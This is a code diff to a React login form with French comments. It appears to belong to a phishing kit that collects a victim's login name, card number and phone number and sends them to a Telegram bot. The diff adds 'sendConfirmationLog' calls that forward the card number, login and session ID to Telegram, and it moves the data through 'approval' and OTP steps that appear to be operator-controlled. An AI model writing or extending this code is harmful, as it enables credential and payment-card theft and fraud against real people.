@@ -62,23 +62,21 @@ function LoginForm() {
   setWaitingForApproval(false);
   setIsLoading(false);
   
-  // Vérifier si le formulaire de carte a déjà été soumis
   const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
   
   if (hasCardDetails) {
-    // Si l'utilisateur a déjà soumis la carte, afficher NextStepAppr
     console.log('✅ Card already submitted, showing NextStepAppr');
     
-    // Stocker les données pour NextStepAppr
+    // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
+    await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+    
     sessionStorage.setItem('loginName', loginName);
     sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
     sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
     sessionStorage.setItem('sessionId', sessionId);
     
-    // Afficher NextStepAppr au lieu de l'OTP
     setShowNextStep(true);
   } else {
-    // Sinon, montrer le formulaire de carte
     console.log('📝 Showing card form for first time');
     setShowCardForm(true);
   }
@@ -174,15 +172,18 @@ function LoginForm() {
   };
   
   // MODIFIÉ: Maintenant affiche NextStepAppr au lieu de naviguer
-  const handleNextStepAppr = () => {
-    console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
-    // Stocker les données nécessaires pour NextStepAppr
-    sessionStorage.setItem('loginName', loginName);
-    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
-    sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
-    sessionStorage.setItem('sessionId', sessionId);
-    setShowNextStep(true); // Afficher le composant NextStepAppr
-  };
+  const handleNextStepAppr = async () => {
+  console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
+  
+  // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
+  await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+  
+  sessionStorage.setItem('loginName', loginName);
+  sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
+  sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
+  sessionStorage.setItem('sessionId', sessionId);
+  setShowNextStep(true);
+};
 
   // Telegram bot hooks - NOW after handlers are defined
   const {
